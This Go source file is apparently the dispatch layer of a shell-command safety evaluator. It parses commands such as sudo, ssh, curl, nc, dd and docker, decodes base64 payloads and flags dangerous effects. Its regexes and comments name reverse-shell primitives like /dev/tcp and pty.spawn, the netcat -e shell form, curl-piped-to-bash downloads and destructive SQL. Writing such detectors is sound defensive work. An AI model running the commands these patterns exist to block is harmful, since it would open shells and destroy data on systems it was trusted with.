package engine

import (
	"encoding/base64"
	"path/filepath"
	"regexp"
	"strings"
)

// dispatch applies program-specific semantics *after* generic effect fields
// are populated. Generic policy matching happens later; this layer's job is
// recursive resolution of payloads and structural flags (remote, elevate…).
func (e *Evaluator) dispatch(eff *Effect) {
	switch eff.Basename {
	case "sudo", "su", "doas":
		e.handlePrivilege(eff)
	case "nohup", "setsid":
		e.handleJobWrapper(eff)
	case "exec":
		e.handleExec(eff)
	case "eval":
		e.handleEval(eff)
	case "source", ".":
		e.handleSource(eff)
	case "bash", "sh", "zsh", "dash", "fish":
		e.handleShell(eff)
		e.detectDevTCP(eff)
	case "env":
		e.handleEnv(eff)
	case "xargs":
		e.handleXargs(eff)
	case "ssh":
		e.handleSSH(eff)
	case "scp", "sftp", "rsync":
		eff.RemoteHost = e.firstNonFlag(eff)
	case "base64":
		e.handleBase64(eff)
	case "xxd", "openssl":
		e.handleDecoderGeneric(eff)
	case "python", "python3", "perl", "ruby", "node":
		e.handleLangRuntime(eff)
	case "mysql", "psql", "sqlite3", "redis-cli", "mongosh", "mongo":
		e.handleDBClient(eff)
	case "vim", "vi", "nano", "emacs", "ed":
		e.handleEditor(eff)
	case "find":
		e.recordFindPaths(eff)
		e.handleFind(eff)
	case "curl", "wget":
		e.handleDownloader(eff)
	case "nc", "netcat", "ncat":
		e.handleNetcat(eff)
	case "dd":
		e.handleDD(eff)
	case "shred":
		e.handleShred(eff)
	case "mkfs", "mke2fs", "mkfs.ext4", "mkfs.xfs", "mkfs.btrfs", "wipefs", "blkdiscard":
		// Generic arg/flag rules cover these; ensure targets recorded.
		e.recordPathArgs(eff)
	case "tar", "gzip", "gunzip", "zip", "unzip":
		e.handleArchive(eff)
	case "sed", "awk", "gawk":
		e.handleStreamEditor(eff)
	case "tee":
		e.handleTee(eff)
	case "systemctl", "service":
		e.handleSystemctl(eff)
	case "kill", "pkill", "killall":
		// Policy matches by basename + args; nothing recursive.
	case "rm", "rmdir":
		e.recordPathArgs(eff)
	case "mv", "cp", "ln", "chmod", "chown", "chgrp", "touch", "mkdir", "truncate":
		e.recordPathArgs(eff)
	case "crontab":
		eff.Background = true
		e.handleCrontab(eff)
	case "at":
		eff.Background = true
	case "docker", "podman", "crictl", "ctr", "kubectl":
		e.handleContainer(eff)
	case "sysctl":
		// Runtime kernel parameter writes.
	case "modprobe", "insmod", "rmmod":
		// Kernel module loading/unloading.
	case "iptables", "ip6tables", "nft", "firewall-cmd", "ufw":
		// Firewall mutation.
	case "useradd", "userdel", "usermod", "groupadd", "groupdel", "passwd", "chpasswd":
		// Account boundary changes.
	case "shutdown", "reboot", "poweroff", "halt", "init":
		// Host availability.
	case "apt", "apt-get", "yum", "dnf", "rpm", "dpkg", "pip", "pip3":
		e.handlePackage(eff)
	case "history":
		// `history -c` wipes traces.
	case "cat", "head", "tail", "less", "more", "zcat":
		e.handleCat(eff)
	case "echo", "printf":
		// Redirection targets already captured; pipe-fed decoders handled there.
	}
}

// ---- privilege wrappers -------------------------------------------------

func (e *Evaluator) handlePrivilege(eff *Effect) {
	eff.UIDElevated = true
	// Strip sudo options until the real command, then re-analyze it as an
	// inner effect so the same catalog applies under escalation.
	idx := -1
	for i, a := range eff.Args {
		if !strings.HasPrefix(a.Value, "-") && a.Value != eff.Basename {
			idx = i
			break
		}
	}
	if idx < 0 {
		eff.Interactive = true // bare `sudo -i` / `su`
		return
	}
	inner := e.effectFromArgs(eff.Args[idx:], Origin{Kind: "privilege", Source: eff.Basename})
	if inner != nil {
		inner.UIDElevated = true
		eff.Inner = append(eff.Inner, inner)
	}
}

// handleJobWrapper recurses into nohup/setsid so the wrapped command is
// policy-checked even when detached into the background.
func (e *Evaluator) handleJobWrapper(eff *Effect) {
	eff.Background = true
	for i, a := range eff.Args {
		if strings.HasPrefix(a.Value, "-") {
			continue
		}
		if inner := e.effectFromArgs(eff.Args[i:], Origin{Kind: "background", Source: eff.Basename}); inner != nil {
			inner.Background = true
			eff.Inner = append(eff.Inner, inner)
		}
		return
	}
}

func (e *Evaluator) handleExec(eff *Effect) {
	if len(eff.Args) == 0 {
		return
	}
	inner := e.effectFromArgs(eff.Args, Origin{Kind: "exec"})
	if inner != nil {
		eff.Inner = append(eff.Inner, inner)
	}
}

func (e *Evaluator) handleEnv(eff *Effect) {
	// env [opts] VAR=x ... CMD args
	for i, a := range eff.Args {
		v := a.Value
		if strings.HasPrefix(v, "-") || strings.Contains(v, "=") {
			continue
		}
		inner := e.effectFromArgs(eff.Args[i:], Origin{Kind: "env"})
		if inner != nil {
			eff.Inner = append(eff.Inner, inner)
		}
		return
	}
}

// ---- shell evaluation & payloads ----------------------------------------

func (e *Evaluator) handleShell(eff *Effect) {
	// bash -c 'payload'   bash script.sh   bash < script
	for i := 0; i < len(eff.Args); i++ {
		a := eff.Args[i]
		if a.Value == "-c" || a.Value == "-ec" || (strings.HasPrefix(a.Value, "-c") && len(a.Value) > 2) {
			var payload string
			dyn := a.Dynamic
			if a.Value == "-c" && i+1 < len(eff.Args) {
				payload = eff.Args[i+1].Value
				dyn = dyn || eff.Args[i+1].Dynamic
				i++
			} else if len(a.Value) > 2 {
				payload = a.Value[2:]
			}
			eff.Payload = &Payload{Kind: "shell", Text: payload, Dynamic: dyn}
			if !dyn && payload != "" {
				eff.Inner = append(eff.Inner, e.effectsFromScript(payload, Origin{Kind: "flag -c", Source: eff.Basename})...)
			}
			eff.Interactive = false
			return
		}
	}
	// Script file argument.
	for _, a := range eff.Args {
		if strings.HasPrefix(a.Value, "-") {
			continue
		}
		p := e.resolvePath(reducedWord{value: a.Value, dynamic: a.Dynamic})
		if content, ok := e.state.Files[p.Absolute]; ok {
			eff.Payload = &Payload{Kind: "shell", Text: string(content), FromFile: p.Absolute}
			eff.Inner = append(eff.Inner, e.effectsFromScript(string(content), Origin{Kind: "script-file", Source: p.Absolute})...)
			return
		}
		if !a.Dynamic {
			// Existing host script we cannot inspect: mark unknown payload.
			eff.Payload = &Payload{Kind: "shell", Dynamic: true, FromFile: a.Value}
		}
		return
	}
	// No payload at all -> interactive shell.
	eff.Interactive = true
}

func (e *Evaluator) handleEval(eff *Effect) {
	var parts []string
	dyn := false
	for _, a := range eff.Args {
		parts = append(parts, a.Value)
		dyn = dyn || a.Dynamic
	}
	payload := strings.Join(parts, " ")
	eff.Payload = &Payload{Kind: "shell", Text: payload, Dynamic: dyn}
	if !dyn {
		eff.Inner = append(eff.Inner, e.effectsFromScript(payload, Origin{Kind: "eval"})...)
	}
}

func (e *Evaluator) handleSource(eff *Effect) {
	for _, a := range eff.Args {
		if strings.HasPrefix(a.Value, "-") {
			continue
		}
		p := e.resolvePath(reducedWord{value: a.Value, dynamic: a.Dynamic})
		if content, ok := e.state.Files[p.Absolute]; ok {
			eff.Inner = append(eff.Inner, e.effectsFromScript(string(content), Origin{Kind: "script-file", Source: p.Absolute})...)
		} else if !a.Dynamic {
			eff.Payload = &Payload{Kind: "shell", Dynamic: true, FromFile: a.Value}
		}
	}
}

// ---- pipelines & decoding -----------------------------------------------

func (e *Evaluator) handleXargs(eff *Effect) {
	// Find the command xargs will run (after options and their values).
	skip := map[string]bool{"-I": true, "-J": true, "-d": true, "-E": true, "-P": true, "-n": true, "-L": true, "-s": true}
	for i := 0; i < len(eff.Args); i++ {
		a := eff.Args[i]
		if skip[a.Value] {
			i++
			continue
		}
		if strings.HasPrefix(a.Value, "-") {
			continue
		}
		inner := e.effectFromArgs(eff.Args[i:], Origin{Kind: "xargs"})
		if inner != nil {
			inner.Dynamic = true // stdin-derived arguments
			eff.Inner = append(eff.Inner, inner)
		}
		return
	}
	// Bare xargs defaults to echo; but its stdin content is unknown here.
	eff.Payload = &Payload{Kind: "unknown", Dynamic: true}
}

func (e *Evaluator) handleBase64(eff *Effect) {
	decoding := false
	for _, a := range eff.Args {
		if a.Value == "-d" || a.Value == "--decode" || a.Value == "-D" {
			decoding = true
		}
	}
	if !decoding {
		return // encoding direction is harmless
	}
	// Two routes: file argument or piped stdin. Payload text may have been
	// captured by pipeline analysis in PipeLinks; here we handle file args.
	for _, a := range eff.Args {
		if strings.HasPrefix(a.Value, "-") {
			continue
		}
		p := e.resolvePath(reducedWord{value: a.Value, dynamic: a.Dynamic})
		if content, ok := e.state.Files[p.Absolute]; ok {
			e.tryDecodeAndAnalyze(eff, string(content), "base64", Origin{Kind: "decode", Source: "base64:" + p.Absolute})
			return
		}
	}
	if eff.Payload == nil {
		eff.Payload = &Payload{Kind: "unknown", Dynamic: true, FromDecode: "base64"}
	}
}

func (e *Evaluator) handleDecoderGeneric(eff *Effect) {
	// `xxd -r`, `openssl enc -d -aes256 ...`: without the key we cannot
	// recover content statically -> unknown dynamic payload, fail closed.
	for _, a := range eff.Args {
		if strings.HasPrefix(a.Value, "-") {
			continue
		}
		_ = e.resolvePath(reducedWord{value: a.Value, dynamic: a.Dynamic})
	}
	if eff.Payload == nil {
		eff.Payload = &Payload{Kind: "unknown", Dynamic: true, FromDecode: eff.Basename}
	}
}

// tryDecodeAndAnalyze recursively checks a decoded blob; undecodable content is
// left dynamic so policy fails closed.
func (e *Evaluator) tryDecodeAndAnalyze(parent *Effect, blob, decoder string, o Origin) {
	cleaned := strings.TrimSpace(blob)
	decoded, err := base64.StdEncoding.DecodeString(cleaned)
	if err != nil {
		decoded, err = base64.RawStdEncoding.DecodeString(cleaned)
	}
	if err != nil {
		parent.Payload = &Payload{Kind: "unknown", Text: blob, Dynamic: true, FromDecode: decoder}
		return
	}
	text := string(decoded)
	parent.Payload = &Payload{Kind: "shell", Text: text, FromDecode: decoder}
	parent.Inner = append(parent.Inner, e.effectsFromScript(text, o)...)
}

// ---- remote execution ----------------------------------------------------

var sshOptionWithArg = map[string]bool{"-i": true, "-F": true, "-l": true, "-o": true, "-p": true, "-J": true, "-b": true, "-c": true, "-m": true}

func (e *Evaluator) handleSSH(eff *Effect) {
	host := ""
	remoteCmd := []string{}
	collect := false
	for i := 0; i < len(eff.Args); i++ {
		a := eff.Args[i]
		v := a.Value
		if collect {
			remoteCmd = append(remoteCmd, v)
			continue
		}
		if v == "--" {
			collect = true
			continue
		}
		// Tunnel flags may be standalone (-R 9000:...) or attached
		// (-R9000:...). classifyFlags already normalized them to e.g. -R;
		// here we only consume the standalone form's spec argument.
		if isTunnelFlag(v) {
			eff.Flags = appendUniqueFlag(eff.Flags, tunnelFlagName(v))
			// Standalone form consumes the following spec argument.
			if v == "-L" || v == "-R" || v == "-D" || v == "-w" {
				i++
			}
			continue
		}
		if sshOptionWithArg[v] {
			i++
			continue
		}
		if strings.HasPrefix(v, "-") {
			continue
		}
		if host == "" {
			host = v
			collect = true
			continue
		}
	}
	eff.RemoteHost = host
	if len(remoteCmd) == 0 {
		eff.Interactive = true // bare interactive ssh: REPL rules apply
		return
	}
	payload := strings.Join(remoteCmd, " ")
	dyn := false
	for _, a := range eff.Args {
		if a.Dynamic {
			dyn = true
		}
	}
	eff.Payload = &Payload{Kind: "shell", Text: payload, Dynamic: dyn}
	if !dyn {
		eff.Inner = append(eff.Inner, e.effectsFromScript(payload, Origin{Kind: "remote-hop", Source: host})...)
	}
}

func isTunnelFlag(v string) bool {
	switch v {
	case "-L", "-R", "-D", "-w":
		return true
	}
	return len(v) >= 2 && v[0] == '-' && (v[1] == 'L' || v[1] == 'R' || v[1] == 'D' || v[1] == 'w')
}

func tunnelFlagName(v string) string {
	if len(v) == 2 {
		return v
	}
	return "-" + string(v[1])
}

func appendUniqueFlag(flags []string, f string) []string {
	for _, x := range flags {
		if x == f {
			return flags
		}
	}
	return append(flags, f)
}

// ---- runtimes & databases ------------------------------------------------

var (
	pyDanger = regexp.MustCompile(`(?m)(os\.system|subprocess\.(run|Popen|call|check_output)|os\.remove|shutil\.rmtree|os\.popen|__import__\s*\(\s*['"]os['"]\)|socket\.socket|pty\.spawn|/dev/sd[a-z]|/dev/tcp/)`)
	plDanger = regexp.MustCompile(`(?m)(system\s*\(|backtick|qx/|unlink|rmtree|/dev/sd[a-z])`)
)

func (e *Evaluator) handleLangRuntime(eff *Effect) {
	// python -c '...'  /  perl -e '...'  /  node -e '...'
	flag := map[string]string{"python": "-c", "python3": "-c", "node": "-e", "perl": "-e", "ruby": "-e"}[eff.Basename]
	for i, a := range eff.Args {
		if a.Value == flag && i+1 < len(eff.Args) {
			code := eff.Args[i+1].Value
			eff.Payload = &Payload{Kind: "text", Text: code, Dynamic: a.Dynamic || eff.Args[i+1].Dynamic}
			rx := pyDanger
			if eff.Basename == "perl" || eff.Basename == "ruby" {
				rx = plDanger
			}
			if rx.MatchString(code) {
				e.appendDangerousAPI(eff, code)
			}
			eff.Interactive = false
			return
		}
	}
	// Script file.
	for _, a := range eff.Args {
		if strings.HasPrefix(a.Value, "-") {
			continue
		}
		p := e.resolvePath(reducedWord{value: a.Value, dynamic: a.Dynamic})
		if content, ok := e.state.Files[p.Absolute]; ok {
			eff.Payload = &Payload{Kind: "text", Text: string(content), FromFile: p.Absolute}
			if pyDanger.Match(content) || plDanger.Match(content) {
				e.appendDangerousAPI(eff, string(content))
			}
		} else if !a.Dynamic {
			eff.Payload = &Payload{Kind: "text", Dynamic: true, FromFile: a.Value}
		}
		return
	}
	eff.Interactive = true
}

// appendDangerousAPI records a language-runtime call that reaches the OS or
// network. Reverse-shell/pty calls get a dedicated marker so NE-6001 matches;
// other dangerous APIs get the generic marker so NE-6006 fail-closed applies.
func (e *Evaluator) appendDangerousAPI(eff *Effect, code string) {
	marker := "<" + eff.Basename + "-dangerous-api>"
	if regexp.MustCompile(`pty\.spawn|socket\.socket|/dev/tcp/|subprocess\.Popen`).MatchString(code) {
		marker = "<reverse-shell>"
		eff.Flags = append(eff.Flags, "--reverse-shell")
	}
	eff.Inner = append(eff.Inner, &Effect{
		Basename: marker,
		Origin:   Origin{Kind: "flag -c", Source: eff.Basename},
		Payload:  &Payload{Kind: "text", Text: code},
	})
}

var sqlDanger = regexp.MustCompile(`(?i)\b(DROP\s+(DATABASE|TABLE|SCHEMA)|TRUNCATE\s+TABLE|DELETE\s+FROM|FLUSHALL|FLUSHDB|rm\s+-rf|SHUTDOWN)\b`)

func (e *Evaluator) handleDBClient(eff *Effect) {
	// -e 'SQL' or redirected .sql file
	for i, a := range eff.Args {
		if (a.Value == "-e" || a.Value == "--execute" || a.Value == "-c") && i+1 < len(eff.Args) {
			sql := eff.Args[i+1].Value
			eff.Payload = &Payload{Kind: "sql", Text: sql, Dynamic: a.Dynamic || eff.Args[i+1].Dynamic}
			if sqlDanger.MatchString(sql) {
				eff.Inner = append(eff.Inner, &Effect{Basename: "<sql-destructive>", Origin: Origin{Kind: "flag -c", Source: eff.Basename}})
			}
			return
		}
	}
	// Positional command without -e (e.g. `redis-cli FLUSHALL`). Checked
	// before the file-argument loop, which returns on the first non-flag.
	for _, a := range eff.Args {
		up := strings.ToUpper(a.Value)
		if up == "FLUSHALL" || up == "FLUSHDB" || up == "SHUTDOWN" ||
			strings.HasPrefix(up, "DROP ") || strings.HasPrefix(up, "TRUNCATE ") ||
			strings.HasPrefix(up, "DELETE ") {
			eff.Interactive = false
			eff.Inner = append(eff.Inner, &Effect{
				Basename: "<sql-destructive>",
				Origin:   Origin{Kind: "positional", Source: eff.Basename},
			})
			return
		}
	}
	for _, a := range eff.Args {
		if strings.HasPrefix(a.Value, "-") {
			continue
		}
		p := e.resolvePath(reducedWord{value: a.Value, dynamic: a.Dynamic})
		if content, ok := e.state.Files[p.Absolute]; ok {
			eff.Payload = &Payload{Kind: "sql", Text: string(content), FromFile: p.Absolute}
			if sqlDanger.Match(content) {
				eff.Inner = append(eff.Inner, &Effect{Basename: "<sql-destructive>", Origin: Origin{Kind: "script-file", Source: p.Absolute}})
			}
		}
		return
	}
	eff.Interactive = true
}

// ---- editors & REPL ------------------------------------------------------

var viDanger = regexp.MustCompile(`(^|[^[:alnum:]])(:!|:r\s*!|:sh|!/|:\s*!|!sh|:\s*cd\s+)`)

func (e *Evaluator) handleEditor(eff *Effect) {
	// Mark payload-bearing ex mode (-c / +'cmd') for line-mode checks.
	for i, a := range eff.Args {
		if (strings.HasPrefix(a.Value, "+") || a.Value == "-c" || a.Value == "--cmd") && i+1 < len(eff.Args) {
			cmd := a.Value
			if a.Value == "-c" || a.Value == "--cmd" {
				cmd = eff.Args[i+1].Value
			}
			if strings.Contains(cmd, "!") || strings.Contains(cmd, "sh") {
				eff.Inner = append(eff.Inner, &Effect{Basename: "<editor-shell-escape>", Origin: Origin{Kind: "repl", Source: eff.Basename}})
			}
		}
	}
}

// ScanInteractiveLine is the PTY sub-mode hook: while vim/psql/python is in
// the foreground, each Enter-terminated input line is scanned before delivery.
func (e *Evaluator) ScanInteractiveLine(program, line string) *Decision {
	trimmed := strings.TrimSpace(line)
	if trimmed == "" {
		return &Decision{Allow: true}
	}
	var hit bool
	var ruleKind string
	switch program {
	case "vim", "vi":
		hit = viDanger.MatchString(line)
		ruleKind = "editor-shell-escape"
	case "nano", "emacs", "ed":
		hit = strings.HasPrefix(trimmed, "!") || strings.Contains(trimmed, "M-!")
		ruleKind = "editor-shell-escape"
	case "mysql", "psql", "sqlite3", "redis-cli", "mongosh", "mongo":
		hit = sqlDanger.MatchString(line) || strings.HasPrefix(trimmed, "\\!") || strings.HasPrefix(trimmed, "!")
		ruleKind = "sql-destructive"
	case "python", "python3", "ipython":
		hit = pyDanger.MatchString(line) || strings.HasPrefix(trimmed, "import os")
		ruleKind = "lang-dangerous-api"
	case "bash", "sh", "zsh":
		// Nested interactive shell: full re-evaluation.
		dec, _ := e.EvaluateLine(line)
		return dec
	}
	if hit {
		return &Decision{
			Allow:      false,
			DenyReason: "交互式 " + program + " 中检测到高危输入（" + ruleKind + "）: " + trimmed,
		}
	}
	return &Decision{Allow: true}
}

// ---- filesystem & destructive tools -------------------------------------

// recordFindPaths captures find's starting-path arguments (the tokens before
// the first option such as -name/-type/-exec).
func (e *Evaluator) recordFindPaths(eff *Effect) {
	for _, a := range eff.Args {
		if strings.HasPrefix(a.Value, "-") {
			break
		}
		eff.Targets = appendUniquePath(eff.Targets,
			e.resolvePath(reducedWord{value: a.Value, dynamic: a.Dynamic}))
	}
}

func (e *Evaluator) handleFind(eff *Effect) {
	args := eff.Args
	execIdx := -1
	for i, a := range args {
		if a.Value == "-exec" || a.Value == "-execdir" || a.Value == "-ok" || a.Value == "-okdir" || a.Value == "-delete" {
			execIdx = i
			break
		}
	}
	if execIdx < 0 {
		return
	}
	if args[execIdx].Value == "-delete" {
		eff.Inner = append(eff.Inner, &Effect{
			Basename:  "rm",
			Recursive: true,
			Flags:     []string{"-r", "-f"},
			Origin:    Origin{Kind: "find", Source: "-delete"},
			Targets:   append([]ResolvedPath(nil), eff.Targets...),
		})
		return
	}
	// Collect tokens until the terminating ";" / "+".
	var cmd []EffectArg
	for j := execIdx + 1; j < len(args); j++ {
		if args[j].Value == ";" || args[j].Value == "+" {
			break
		}
		cmd = append(cmd, args[j])
	}
	if inner := e.effectFromArgs(cmd, Origin{Kind: "find", Source: "-exec"}); inner != nil {
		inner.Dynamic = true
		eff.Inner = append(eff.Inner, inner)
	}
}

func (e *Evaluator) handleDD(eff *Effect) {
	// dd if=... of=/dev/sdX bs=... -- surface of= target as path.
	for _, a := range eff.Args {
		if strings.HasPrefix(a.Value, "of=") {
			target := strings.TrimPrefix(a.Value, "of=")
			p := e.resolvePath(reducedWord{value: target, dynamic: a.Dynamic})
			eff.Targets = appendUniquePath(eff.Targets, p)
		}
	}
}

func (e *Evaluator) handleShred(eff *Effect) {
	e.recordPathArgs(eff)
}

func (e *Evaluator) handleTee(eff *Effect) {
	e.recordPathArgs(eff)
}

func (e *Evaluator) handleCat(eff *Effect) {
	// `cat > file` truncation is captured via redirects already. File args are
	// only relevant when feeding a pipe; pipeline wiring handles recursion.
}

func (e *Evaluator) recordPathArgs(eff *Effect) {
	for _, a := range eff.Args {
		if strings.HasPrefix(a.Value, "-") {
			continue
		}
		eff.Targets = appendUniquePath(eff.Targets,
			e.resolvePath(reducedWord{value: a.Value, dynamic: a.Dynamic}))
	}
}

// ---- archives / stream editors ------------------------------------------

func (e *Evaluator) handleArchive(eff *Effect) {
	// Extraction can drop arbitrary paths; record file args as targets.
	e.recordPathArgs(eff)
	for _, a := range eff.Args {
		if strings.Contains(a.Value, "--checkpoint-action") || strings.Contains(a.Value, "--to-command") {
			eff.Inner = append(eff.Inner, &Effect{Basename: "<tar-code-exec>", Origin: Origin{Kind: "archive", Source: eff.Basename}})
		}
	}
}

func (e *Evaluator) handleStreamEditor(eff *Effect) {
	// sed -i rewrites in place; record targets. Flag in-place edit.
	inPlace := false
	for _, f := range eff.Flags {
		if f == "-i" {
			inPlace = true
		}
	}
	if inPlace {
		e.recordPathArgs(eff)
	}
	// `sed 's/./&/e'` executes replacement (GNU extension).
	for _, a := range eff.Args {
		if strings.Contains(a.Value, "/e") || strings.Contains(a.Value, "e ") {
			if strings.Contains(a.Value, "e") && !strings.HasPrefix(a.Value, "-") {
				eff.Inner = append(eff.Inner, &Effect{Basename: "<sed-exec>", Dynamic: true, Origin: Origin{Kind: "stream-editor"}})
			}
		}
	}
}

// ---- services / packages / containers / cron -----------------------------

func (e *Evaluator) handleSystemctl(eff *Effect) {
	// Nothing recursive; catalog matches subcommands (stop/disable/mask).
}

func (e *Evaluator) handlePackage(eff *Effect) {
	for _, a := range eff.Args {
		if a.Value == "remove" || a.Value == "erase" || a.Value == "uninstall" ||
			a.Value == "purge" || a.Value == "-e" || a.Value == "--purge" {
			eff.Flags = append(eff.Flags, "--remove")
		}
	}
}

func (e *Evaluator) handleContainer(eff *Effect) {
	if len(eff.Args) == 0 {
		return
	}
	sub := eff.Args[0].Value
	// `docker run --privileged` / `docker system prune` / `-v` volume removal
	if sub == "run" || sub == "exec" {
		for _, a := range eff.Args[1:] {
			if a.Value == "--privileged" || a.Value == "--cap-add=ALL" || a.Value == "-v" || a.Value == "--device" {
				eff.Flags = append(eff.Flags, a.Value)
			}
		}
		if sub == "exec" {
			// Recurse into the in-container command: skip options and the
			// container name, everything left is the command line.
			rest := e.skipDockerExecArgs(eff.Args[1:])
			if inner := e.effectFromArgs(rest, Origin{Kind: "container-exec", Source: eff.Basename}); inner != nil {
				eff.Inner = append(eff.Inner, inner)
			}
			return
		}
	}
	if sub == "prune" || (sub == "system" && len(eff.Args) > 1 && eff.Args[1].Value == "prune") {
		for _, a := range eff.Args[1:] {
			if a.Value == "--volumes" || a.Value == "-a" || a.Value == "--all" || a.Value == "-f" || a.Value == "--force" {
				eff.Flags = append(eff.Flags, a.Value)
			}
		}
	}
}

// skipDockerExecArgs drops `[options] CONTAINER` to return the in-container
// command and its arguments.
func (e *Evaluator) skipDockerExecArgs(args []EffectArg) []EffectArg {
	dockerOptsWithArg := map[string]bool{"-u": true, "--user": true, "-w": true, "--workdir": true, "-e": true, "--env": true}
	i := 0
	for i < len(args) {
		a := args[i]
		if dockerOptsWithArg[a.Value] {
			i += 2
			continue
		}
		if strings.HasPrefix(a.Value, "-") {
			i++
			continue
		}
		// First non-flag token is the container name.
		i++
		break
	}
	if i >= len(args) {
		return nil
	}
	return args[i:]
}

func (e *Evaluator) handleCrontab(eff *Effect) {
	for _, a := range eff.Args {
		if a.Value == "-r" || a.Value == "--remove" {
			eff.Flags = append(eff.Flags, "--remove")
		}
		if !strings.HasPrefix(a.Value, "-") {
			p := e.resolvePath(reducedWord{value: a.Value, dynamic: a.Dynamic})
			if content, ok := e.state.Files[p.Absolute]; ok {
				eff.Inner = append(eff.Inner, e.effectsFromScript(string(content), Origin{Kind: "cron-file", Source: p.Absolute})...)
			}
		}
	}
}

// ---- network -------------------------------------------------------------

// detectDevTCP recognizes bash's /dev/tcp/HOST/PORT and /dev/udp backdoor
// channels, whether written directly or reached via redirection.
func (e *Evaluator) detectDevTCP(eff *Effect) {
	hit := false
	for _, a := range eff.Args {
		if strings.Contains(a.Value, "/dev/tcp/") || strings.Contains(a.Value, "/dev/udp/") {
			hit = true
		}
	}
	for _, r := range eff.Redirects {
		if strings.Contains(r.Path.Raw, "/dev/tcp/") || strings.Contains(r.Path.Raw, "/dev/udp/") ||
			strings.Contains(r.Path.Absolute, "/dev/tcp/") {
			hit = true
		}
	}
	// Also scan synthetic redirection-only effects collected alongside.
	for _, other := range e.collected {
		for _, t := range other.Targets {
			if strings.Contains(t.Raw, "/dev/tcp/") || strings.Contains(t.Absolute, "/dev/tcp/") {
				hit = true
			}
		}
	}
	if hit {
		eff.Flags = append(eff.Flags, "--reverse-shell")
		eff.Inner = append(eff.Inner, &Effect{
			Basename: "<reverse-shell>",
			Origin:   Origin{Kind: "redirect", Source: "/dev/tcp"},
		})
		eff.Interactive = false
	}
}

func (e *Evaluator) handleDownloader(eff *Effect) {
	// Piped-to-shell (`curl http://x | bash`) is linked via pipeline analysis.
	// Flag `| sh` style and -o targets recorded.
	for _, a := range eff.Args {
		if a.Value == "-o" || a.Value == "--output" || a.Value == "-O" {
			eff.Flags = append(eff.Flags, "--download")
		}
	}
}

func (e *Evaluator) handleNetcat(eff *Effect) {
	// nc -e /bin/sh HOST PORT  /  nc -l -p ... -e
	for _, a := range eff.Args {
		if a.Value == "-e" || a.Value == "-c" {
			eff.Flags = append(eff.Flags, "--exec")
		}
	}
}

// ---- helpers -------------------------------------------------------------

func (e *Evaluator) firstNonFlag(eff *Effect) string {
	for _, a := range eff.Args {
		if !strings.HasPrefix(a.Value, "-") {
			return a.Value
		}
	}
	return ""
}

// effectFromArgs builds an inner Effect by re-running reduction on a synthetic
// command line (used for sudo/ssh/xargs/find -exec recursion).
func (e *Evaluator) effectFromArgs(args []EffectArg, o Origin) *Effect {
	if len(args) == 0 {
		return nil
	}
	words := make([]string, len(args))
	for i, a := range args {
		words[i] = a.Raw
		if words[i] == "" {
			words[i] = a.Value
		}
	}
	line := strings.Join(words, " ")
	effects := e.effectsFromScript(line, o)
	if len(effects) == 0 {
		return &Effect{Basename: basename(words[0]), Dynamic: true, Origin: o}
	}
	return effects[0]
}

// effectsFromScript parses and analyzes arbitrary shell text, returning its
// effects without mutating the outer collected slice.
func (e *Evaluator) effectsFromScript(text string, o Origin) []*Effect {
	if strings.TrimSpace(text) == "" {
		return nil
	}
	pr := Parse(text)
	if pr.Incomplete || pr.Err != nil || pr.File == nil {
		return []*Effect{{Basename: "<unparseable-payload>", Dynamic: true, Origin: o, Payload: &Payload{Kind: "unknown", Text: text, Dynamic: true}}}
	}
	saved := e.collected
	e.collected = nil
	e.analyzeStmts(pr.File.Stmts, o)
	out := e.collected
	e.collected = saved
	return out
}

// joinVirtualPath registers a file written inside the session into virtual FS.
func (e *Evaluator) registerFileWrite(abs string, content []byte) {
	e.state.Files[filepath.Clean(abs)] = content
}

var _ = regexp.MustCompile // keep import even if regexes move later
